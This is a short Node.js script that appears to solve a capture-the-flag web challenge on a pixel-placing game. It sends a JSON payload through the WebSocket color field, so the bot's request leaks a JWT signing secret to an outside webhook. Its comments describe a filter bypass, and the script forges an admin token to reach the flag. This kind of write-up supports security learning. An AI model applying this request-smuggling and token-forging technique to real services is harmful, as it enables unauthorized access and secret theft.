const WebSocket = require('ws').WebSocket;
const jwt = require('jsonwebtoken');

const WEBSITE = 'http://localhost:8000';

const conn = new WebSocket(`ws://${WEBSITE}/`);

conn.onopen = function() {
	// pick a pixel that the bot will replace
	let x = 205;
	let y = 109;
	let webhook = 'https://webhook.example/endpoint';

	// Place a pixel with a JSON payload as the color
	// (will get interpreted by axios as a request with options)
	conn.send(`${x}${y}{"url":"${webhook}"}`);
	// send it twice to ensure the bot overwrites it at least once
	setTimeout(() => conn.send(`${x}${y}{"url":"${webhook}"}`), 5000);
	// alternatively, the filtering on the color is weak,
	// so a payload like "http:/:///webhook.example/endpoint" will bypass it
	// (the quotes are needed)
	
	// webhook will be sent a request with the header `Secret`,
	// that's the secret used to sign the jwt token
	// we can use that to forge our own token
	let secret = 'heres_your_goddamn_web_challenge9138467';
	let token = jwt.sign({ cooldown: 1, admin: true }, secret, { algorithm: 'HS256' });
	console.log(token);
	// overwrite the `token` cookie in your browser with this string
	// and visit https://localhost:8000/flag for the solve!
}
